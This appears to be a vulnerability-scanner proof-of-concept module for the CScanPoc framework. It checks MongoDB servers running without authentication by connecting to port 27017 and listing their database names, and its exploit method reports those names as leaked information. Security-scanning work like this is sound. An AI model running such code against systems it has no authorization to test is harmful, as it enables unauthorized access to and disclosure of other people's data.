# coding: utf-8
import urllib.parse
import pymongo

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Mongodb_0101'  # 平台漏洞编号，留空
    name = 'Mongodb 配置不当导致未授权访问'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-12-10'  # 漏洞公布时间
    desc = '''
    mongodb启动时未加 --auth选项，导致无需认证即可连接mongodb数据库，从而导致一系列安全问题。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mongodb'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd808b3f0-9d0f-4804-850f-c4d503187abe'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target
            ip_addr = urllib.parse.urlparse(verify_url).netloc
            conn = pymongo.MongoClient(ip_addr, 27017, socketTimeoutMS=3000)
            dbname = conn.database_names()
            if dbname:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target
            ip_addr = urllib.parse.urlparse(verify_url).netloc
            conn = pymongo.MongoClient(ip_addr, 27017, socketTimeoutMS=3000)
            dbname = conn.database_names()
            if dbname:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞；获取信息：vul_url={vul_url}， database_names={database_names}'.format(
                    target=self.target, name=self.vuln.name, vul_url=ip_addr + ':27017', database_names=dbname))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
